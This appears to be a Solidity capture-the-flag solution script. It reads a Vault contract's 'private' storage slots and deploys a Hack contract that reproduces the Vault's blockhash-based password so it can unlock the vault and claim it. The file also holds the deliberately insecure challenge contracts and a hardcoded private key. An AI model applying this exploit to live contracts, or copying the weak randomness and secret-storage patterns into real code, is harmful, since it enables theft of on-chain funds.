// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xee33892e53F5CB04479A901c80B1e503f5Bb309c);
    address wallet = 0x51aE34025A2c80CCe6a842E1F7E6645E1C223bfb;
    Vault public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x90ef07eeb540713e09a949d52e4652874b0e4d8d607eb016f75e200f9395cb4c);

        console.log(wallet.balance);
        bytes32 secret = vm.load(address(target), bytes32(abi.encode(uint256(1))));
        address owner = abi.decode(abi.encode(secret), (address));
        console.logBytes32(secret);

        bytes32 passphrase = vm.load(address(target), bytes32(abi.encode(uint256(2))));
        console.logBytes32(passphrase);

        secret = vm.load(address(target), bytes32(abi.encode(uint256(3))));
        uint256 nonce = abi.decode(abi.encode(secret), (uint256));
        console.logBytes32(secret);

        Hack hack = new Hack(address(target), owner, passphrase, nonce);
        hack.solve();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// "PrivateKey": "0x90ef07eeb540713e09a949d52e4652874b0e4d8d607eb016f75e200f9395cb4c",
//     "Address": "0x51aE34025A2c80CCe6a842E1F7E6645E1C223bfb",
//     "TargetAddress": "0x1255990C6DD6aE0730b1Ce529d5422aD1E4B4AC8",
//     "setupAddress": "0xee33892e53F5CB04479A901c80B1e503f5Bb309c"


contract Hack {
        Vault public target;
        address public owner;
        bytes32 private passphrase;
        uint256 public nonce;
        constructor(address _target, address _owner, bytes32 _passphrase, uint256 _nonce) {
            target = Vault(_target);
            owner = _owner;
            passphrase = _passphrase;
            nonce = _nonce;
        }

        function _generateKey(uint256 _reductor) private returns (uint256 ret) {
            ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
            nonce++;
        }

        function _magicPassword() public returns (bytes8) {
            uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
            uint128 _key2 = uint128(_generateKey(2));
            bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
            return (_secret >> 32 | _secret << 16);
        }

        function solve() external  {
            uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
            uint128 password = uint128(uint64(_secretKey)) + 2**64 * uint128(uint64(uint160(owner)));
            bytes16 passw = bytes16(password);
            target.unlock(passw);
            target.claimContent();
        }
}

contract Setup {
    Vault public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Vault();
    }

    function isSolved() public view returns (bool) {
        return TARGET.mapHolder() != address(TARGET);
    }
}

contract Vault {
    struct Map {
        address holder;
    }

    Map map;
    address public owner;
    bytes32 private passphrase;
    uint256 public nonce;
    bool public isUnlocked;

    constructor() {
        owner = msg.sender;
        passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
        map = Map(address(this));
    }

    function mapHolder() public view returns (address) {
        return map.holder;
    }

    function claimContent() public {
        require(isUnlocked);
        map.holder = msg.sender;
    }

    function unlock(bytes16 _password) public {
        uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
        uint128 _input = uint128(_password);
        require(_input != _secretKey, "Case 1 failed");
        require(uint64(_input) == _secretKey, "Case 2 failed");
        require(uint64(bytes8(_password)) == uint64(uint160(owner)), "Case 3 failed");
        isUnlocked = true;
    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
}